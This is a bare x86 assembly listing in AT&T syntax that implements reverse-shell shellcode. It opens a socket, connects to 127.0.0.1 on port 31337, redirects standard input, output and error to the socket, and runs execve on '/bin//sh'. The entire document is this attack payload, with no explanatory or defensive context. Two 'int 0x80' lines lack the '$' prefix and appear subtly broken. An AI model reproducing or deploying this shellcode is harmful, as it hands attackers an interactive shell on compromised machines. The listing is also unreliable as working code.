
push	%ebp
mov	%esp,%ebp
sub	$0x20,%esp
xor	%eax,%eax
mov	%eax,8(%esp)
movw	$0x697a,0x2(%esp)
add	$0x2,%eax
mov	%eax,(%esp)
shl	$0x17,%eax
add	$0x7f,%eax
mov	%eax,0x4(%esp)
xor	%eax,%eax
push	%eax
inc	%eax
push	%eax
mov	%eax,%ebx
inc	%eax
push	%eax
movl	$102,%eax
leal	-32(%ebp),%ecx
int	$0x80
add	$0xc,%esp
mov	%eax,16(%ebp)
mov	%esp,%ecx
mov	$0x10,%eax
push	%eax
push	%ecx
pushl	16(%ecx)
push	$0x66
pop	%eax
xor	%ebx,%ebx
add	$0x3,%ebx
mov	%esp,%ecx
int	$0x80
add	$0xc,%esp
push	$0x3f
mov	(%esp),%eax
mov	0x14(%esp),%ebx
xor	%ecx,%ecx
int	$0x80
mov	(%esp),%eax
inc	%ecx
int	$0x80
pop	%eax
inc	%ecx
int	0x80
mov	$0xb,%eax
cltd
push	%edx
push	$0x68732f2f
push	$0x6e69622f
mov	%esp,%ebx
push	%edx
push	%ebx
mov	%esp,%ecx
int	0x80
